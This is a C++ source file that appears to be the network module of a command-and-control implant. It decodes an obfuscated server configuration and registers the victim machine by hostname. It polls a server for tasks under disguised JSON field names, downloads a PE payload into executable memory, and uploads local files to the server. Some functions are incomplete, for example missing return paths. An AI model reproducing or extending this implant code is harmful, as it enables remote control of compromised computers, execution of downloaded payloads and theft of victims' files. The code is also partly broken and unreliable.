#include "network.h"
#include <iostream>
using namespace cpr;
//using namespace std;
using json = nlohmann::json;


std::string getInitialPass() { // returns heap allocated memory
    NETCONFIG config;
    std::vector<BYTE> ret;
    for (BYTE i : config.config) {
        if (i != 0xe9) {
            ret.push_back(i);
        }
        else {
            break;
        }
    }
    std::string end = resolveString(ret);
    return end;
}

char* getRegistrationEndpoint() {  // returns heap allocated memory
    int numE9s = 0;
    std::vector<BYTE> ret;
    NETCONFIG config;

    for (BYTE i : config.config) {
        if (i != 0xe9) {
            ret.push_back(i);
        }
        else if (numE9s == 2) {
            return resolveString(ret);
        }
        else {
            numE9s++;
            ret.clear();
        }
    }
 
}

char* getServer() {
    int numE9s = 0;
    std::vector<BYTE> ret;
    NETCONFIG config;

    for (BYTE i : config.config) {
        if (i != 0xe9) {
            ret.push_back(i);
        }
        else if (numE9s == 1) {
            return resolveString(ret);
        }
        else {
            numE9s++;
            ret.clear();
        }
    }
}




void initRegistationAuth(PAUTHDATA auth) {
     std::string pass = getInitialPass();
     std::cout << pass << std::endl;
     auth->pass = pass;
    std::cout << auth->pass << std::endl;
    auth->modifer = NULL;
    auth->registraton = true;
}


void registerAgent(PAPI api, PAUTHDATA authenticationData) {
   // PAUTHDATA authenticationData;
    initRegistationAuth(authenticationData);


    using getHost = bool(*__stdcall)(LPCSTR, LPDWORD);
    getHost getCompName = reinterpret_cast<getHost>(api->GetComputerNameA);
    DWORD size = 260;
    char name[260];
    
    getCompName(name, &size);
    
    std::string hostname = name;
    json requestBody;
    requestBody["host"] = hostname;
    requestBody["password"] = authenticationData->pass;
  //  std::cout << authenticationData->pass << std::endl;

    char* endpoint = getRegistrationEndpoint();
    char* server = getServer();

    std::string uri;
    uri.append(server);
    uri.append(endpoint);

  //  std::cout << "Using -->" << uri << " to register agent\n";
    Url url = uri;


    SYSTEM_INFO sysInfo = { 0 };
    using grabSysInfo = void(*__stdcall)(LPSYSTEM_INFO);
    grabSysInfo getSysInfo = reinterpret_cast<grabSysInfo>(api->GetSystemInfo);
    getSysInfo(&sysInfo);
    BYTE key = (BYTE)sysInfo.dwNumberOfProcessors;

   // std::cout << requestBody.dump() << std::endl;
  

    Response r = Post(url, Body{ requestBody.dump()}, Header{{"Content-Type", "application/json"}});
  //  printf("Status Code-->%d\n", r.status_code);
 //   std::cout << "Return data: " << r.text << "\n\n";

    if (r.status_code == 200) {
        json recv = json::parse(r.text);
       // std::cout << r.text << std::endl;
        int retCode = recv["x-forward"].get<int>();
        if (retCode == 10) { // 80 
            std::string password = recv["queue-number"].get<std::string>();
            int modifier = recv["hop-count"].get<int>();
            std::string uuid = recv["id"].get<std::string>();
            authenticationData->pass = password;
            authenticationData->modifer = modifier;
            authenticationData->uuid = uuid;
        }
        else {
            authenticationData->pass = "";
            authenticationData->modifer = NULL;
        }
        
    }
    free(endpoint);
    free(server);

    return;
}












BYTE* retrievePayload(PAPI api, PAUTHDATA auth, std::string modUUID) {
    std::string url = "127.0.0.1/download";
    Url u = url;

    json reqBody;
    reqBody["mod"] = modUUID;
    reqBody["uuid"] = auth->uuid; // this is the agents uuid assigned during registration

    Response r = Get(u, Body{ reqBody.dump() }, Header{ {"Content-Type", "application/json"} });
    int size_file = r.text.size();
    using virtAlloc = LPVOID(*__stdcall)(LPVOID, SIZE_T, DWORD, DWORD);
    virtAlloc vAlloc = reinterpret_cast<virtAlloc>(api->VirtualAlloc);
    BYTE* file = (BYTE*)vAlloc(NULL, size_file, MEM_COMMIT, PAGE_EXECUTE_READWRITE);;
    int index = 0;
    for (BYTE i : r.text) {
     //   printf("%x", i);
        file[index] = i;
        index++;
    }
    auto nt = (PIMAGE_NT_HEADERS)(file + ((PIMAGE_DOS_HEADER)file)->e_lfanew);
    auto opt = (PIMAGE_OPTIONAL_HEADER)&nt->OptionalHeader;
    DWORD sizeImage = opt->SizeOfImage;
    



    return file;
}




void getTask(PAUTHDATA authdata, std::string uri, PTASK t) {
    Url url = Url{uri};

    json reqBody;
    std::cout << authdata->uuid;
    reqBody["uuid"] = authdata->uuid;
    Response r = Get(url, Body{reqBody.dump()}, Header{ {"Content-Type", "application/json"} });
    if (r.status_code == 200) {
        json recv = json::parse(r.text);
        t->taskNumber = recv["x-forward"]; 
        t->args = recv["hop-count"];
        t->taskId = recv["id"];
    }
    else {
        t->taskNumber = 0;
        t->args = "";
        t->taskId = "";
    }
    
}


bool updateTask(PAUTHDATA authdata, Task task, std::string uri, std::string status) {
    Url url = Url{ uri };

    json reqBody;
    reqBody["uuid"] = authdata->uuid;
    reqBody["id"] = task.taskId;
    reqBody["data"] = task.ReturnData;
    reqBody["status"] = status;

    Response r = Post(url, Body{ reqBody.dump() }, Header{ {"Content-Type", "application/json"} });
    if (r.status_code == 200) {
        return true;
    }
    return false;

}


bool uploadFile(std::string& result, std::string uri, std::string filePath) {
    Url url = Url{ uri };

    Response r = Post(url, Multipart{ {"multipart/form-data", cpr::File{filePath}} });
    if (r.status_code == 200) {
        result.append("Successfully uploaded: ");
        result.append(filePath);
        return true;
    }
    else {
        result.append("Unable to upload: ");
        result.append(filePath);
        return false;
    }
}